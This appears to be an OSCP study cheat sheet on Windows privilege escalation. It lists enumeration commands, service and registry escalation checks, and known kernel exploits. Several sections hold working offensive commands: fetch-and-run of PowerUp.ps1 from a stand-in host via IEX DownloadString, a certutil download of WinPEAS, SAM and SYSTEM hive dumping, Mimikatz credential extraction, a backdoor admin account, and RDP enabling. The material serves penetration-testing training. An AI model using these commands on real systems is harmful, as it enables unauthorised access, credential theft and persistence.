# Windows Privilege Escalation

Essential techniques for escalating privileges on Windows systems during OSCP.

## Quick Enumeration

### System Info
```powershell
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### User Info
```powershell
whoami /all
net user
net localgroup Administrators
```

### Network Info
```powershell
ipconfig /all
netstat -ano
netsh advfirewall show currentprofile
```

## Common Vectors

### Unquoted Service Paths
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
```

### Weak Service Permissions
```powershell
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
sc qc <SERVICE_NAME>
```

### AlwaysInstallElevated
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Scheduled Tasks
```powershell
schtasks /query /fo LIST /v
```

## Automated Tools

### WinPEAS
```powershell
certutil -urlcache -f http://YOUR_IP/winpeas.exe winpeas.exe
winpeas.exe
```

### PowerUp
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/PowerUp.ps1')
Invoke-AllChecks
```

## Kernel Exploits

### Common Exploits
- MS16-032 (Secondary Logon)
- MS16-135 (Win32k.sys)
- MS17-010 (EternalBlue)

### Check Patch Status
```powershell
systeminfo | findstr "KB3139914 KB3140721"
```

## Credential Hunting

### SAM Database
```powershell
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# Transfer and extract with pwdump.py
```

### Mimikatz
```powershell
privilege::debug
sekurlsa::logonpasswords
```

## Post-Exploitation

### Add Admin User
```powershell
net user hacker P@ssw0rd /add
net localgroup administrators hacker /add
```

### Enable RDP
```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

## Quick Checks
1. **Services**: Unquoted paths, weak permissions
2. **Scheduled Tasks**: Misconfigurations
3. **Registry**: Auto-runs, AlwaysInstallElevated
4. **Files**: Passwords in configs, backups
5. **Kernel**: Missing patches

## Practice
- HTB: Blue, Legacy
- TryHackMe: Windows Privesc
